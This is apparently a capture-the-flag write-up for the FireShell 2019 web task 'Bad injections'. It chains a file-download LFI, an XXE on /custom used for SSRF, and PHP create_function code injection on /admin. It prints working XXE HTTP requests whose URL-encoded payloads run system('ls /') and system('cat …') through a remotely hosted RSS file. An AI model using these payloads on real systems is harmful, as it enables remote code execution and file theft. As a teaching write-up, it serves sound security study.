---
layout: post
title: Bad injections
category: FireShell 2019
---

Hello guys , i would like to share with you my solution for this web task 

So this task based on 3 parts (LFI->XXE->RCE) each part will allow us to move to the next stage until we get the FLAG

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/51808143-62d0d900-2290-11e9-8aad-448c7c976a17.png"></p>

By accessing to the task url we can see menu with some actions 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/51808175-b7745400-2290-11e9-9b71-3af24350703d.png"></p>

When we look at the html source code we can notice link to download this files 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/51808189-e8548900-2290-11e9-9368-dd439db8a359.png"></p>

So each file can be downloaded using this url schema

http://68.183.31.62:94/download?file=files/1.jpg&hash=7e2becd243552b441738ebc6f2d84297

```
1-file : will be the file location  
2-hash : for now its md5 hash (we do not know how this hash generated )
```

By doing some recon stuff and trying to get more informations about this task , nothing look important for us (only download link )

I tried to exploit it using hash length attack but no chance (not part of this challenge)

Then notice that :

```
md5($_GET('hash')) == $_GET('file')
```

which means for now we can load any file we want ( if we know location of course ) **PART1**

As there is 2 files on the web app , we tried to check the second one 

http://68.183.31.62:94/download?file=files/test.txt&hash=293d05cb2ced82858519bdec71a0354b

Download this file we got this 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/51808272-15ee0200-2292-11e9-9956-e62fa534ef81.png"></p>

Ok look like there is something for us 

`
<b>Notice</b>:  Undefined variable: type in <b>/app/Controllers/Download.php</b> on line <b>21</b><br />
`

Using first part we can read this file

![download_lfi](https://user-images.githubusercontent.com/7364615/51808298-67968c80-2292-11e9-9b30-8ebcdd05b85e.png)

Here we can now its the file used to download in part1

By digging more we start read more files , moving to index.php file 

![index](https://user-images.githubusercontent.com/7364615/51808648-daa20200-2296-11e9-977c-4ac60cac2cb9.png)

We know for now that we have many other folders (Controllers / Views / Classes / files)

But also there is file named "Routes.php" in index.php that can help us to move on

By reading this file we find all routes and also what we need to do next (stage 2 )

![routes_xxe_rce_admin](https://user-images.githubusercontent.com/7364615/51808356-1d61db00-2293-11e9-816b-70ff45f0f558.png)

The two important part : (/custom & /admin) , lets read them (Custom.php & Admin.php )

![custom_xxe](https://user-images.githubusercontent.com/7364615/51808369-4bdfb600-2293-11e9-95d0-f919afd1edd1.png)

from the first look we confirm we have XXE on **/custom** route

![xxe](https://user-images.githubusercontent.com/7364615/51808420-cdcfdf00-2293-11e9-8656-8d9831440769.png)


OK here we can said why we don't migrate from XXE->RCE , but no we can't because wrappers like "expect" disabled on the server side so we can only read files or exploit SSRF to request internal app **PART2**

OK! lets move to Admin.php code 

![admin_rce](https://user-images.githubusercontent.com/7364615/51808427-e4763600-2293-11e9-936b-01aec33e7c84.png)

Ugly code, but we need to understand it 
So here this code :

```
1-wait two arguments ($url & $order) ==> $url should be xml file
2-Read xml file (RSS) and try to load it on $data array
3-Then usort this array using new function (creeat_function) witch use our $order argument to compare two rows
4-Print back custom html code 
```

By reading this code we confirm we have RCE (create_function can be used to injection php code ) **PART3**

because create_function is an eval call which does the following :

```
function create_function($args, $code) {
  eval("
    function lambda_1 ($args) { $code }
  ");
  return 'lambda_1';
}
```

But wait !! we forget the routes part ! 

```
Route::set('admin',function(){
  if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
    Admin::createView('Admin');
  }else{
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    }else{
     echo ";(";
    }
  }
});
```

We can only call sort function (where we have create_function ) only if we request /admin from local 

Yes we can :D , we already have XXE which means we can make this possible by exploit SSRF vuln and load /admin route from there :)

We prepare simple rss file to be parsed as **/admin** route request 2 arguments on of them should be XML file

```
<?xml version="1.0" encoding="UTF-8" ?>
<rss>
<channel>
  <item>
    <link>/xml/xml_rss.asp</link>
  </item>
  <item>
    <link>/xml</link>
  </item>
</channel>
</rss>
```

we can simply host this content on https://pastebin.com/ 

Then next step we just need to prepare the XXE payload 

```
link,$b->link); } system("ls /"); //
```

```
POST /custom HTTP/1.1
Host: 68.183.31.62:94
Content-Type: application/x-www-form-urlencoded
Content-Length: 412

<!DOCTYPE foo [
<!ELEMENT foo ANY><!ENTITY out SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1/admin?rss=https://pastebin.com/*****&order=link%2C%24b-%3Elink%29%3B%20%7D%20system%28%22ls%20%2F%22%29%3B%20%2F%2F">]>
<root><name>&out;</name></root>
```

Using this one we get that there is flag file **/da0f72d5d79169971b62a479c34198e7** , so we change our payload . 

Final payload for the code injection 

```
link,$b->link); } system("cat /da0f72d5d79169971b62a479c34198e7"); //
```

```
POST /custom HTTP/1.1
Host: 68.183.31.62:94
Content-Type: application/x-www-form-urlencoded
Content-Length: 412

<!DOCTYPE foo [
<!ELEMENT foo ANY><!ENTITY out SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1/admin?rss=https://pastebin.com/*****&order=link%2C%24b%3Elink%29%3B%20%7D%20system%28%22cat%20%2Fda0f72d5d79169971b62a479c34198e7%22%29%3B%20%2F%2F">]>
<root><name>&out;</name></root>
```

And Yes we got our FLAG :

```
f#{1_d0nt_kn0w_wh4t_i4m_d01ng}
```
